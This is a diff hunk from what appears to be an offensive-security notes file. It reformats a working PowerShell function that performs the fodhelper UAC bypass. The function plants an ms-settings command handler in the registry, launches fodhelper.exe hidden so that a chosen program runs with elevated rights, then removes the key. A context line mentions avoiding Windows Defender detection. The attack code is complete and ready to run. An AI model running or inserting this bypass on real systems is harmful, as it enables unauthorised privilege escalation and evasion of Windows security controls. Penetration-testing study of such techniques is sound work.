@@ -7,21 +7,32 @@ pass in argument to `-program` or it gets detected by windows defender trying to
 
 https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/
 ```powershell
-function FodhelperBypass() {
-  Param ( [String]$program = "cmd /c start powershell.exe" #default )
-  #Create registry structure
-  New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
-  New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-  Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
-  #Perform the bypass
-  Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-  #Remove registry structure
-  Start-Sleep 3
-  Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+function FodhelperBypass(){ 
+ 
+Param (    
+ 
+ [String]$program = "cmd /c start powershell.exe" #default
+ 
+      )
+ 
+#Create registry structure
+ 
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
+ 
+#Perform the bypass
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+ 
+#Remove registry structure
+Start-Sleep 3
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+ 
 }
+
 # run it
-FodhelperBypass
 FodhelperBypass -program cmd
+FodhelperBypass
 ```
 
 ## uacme bypass
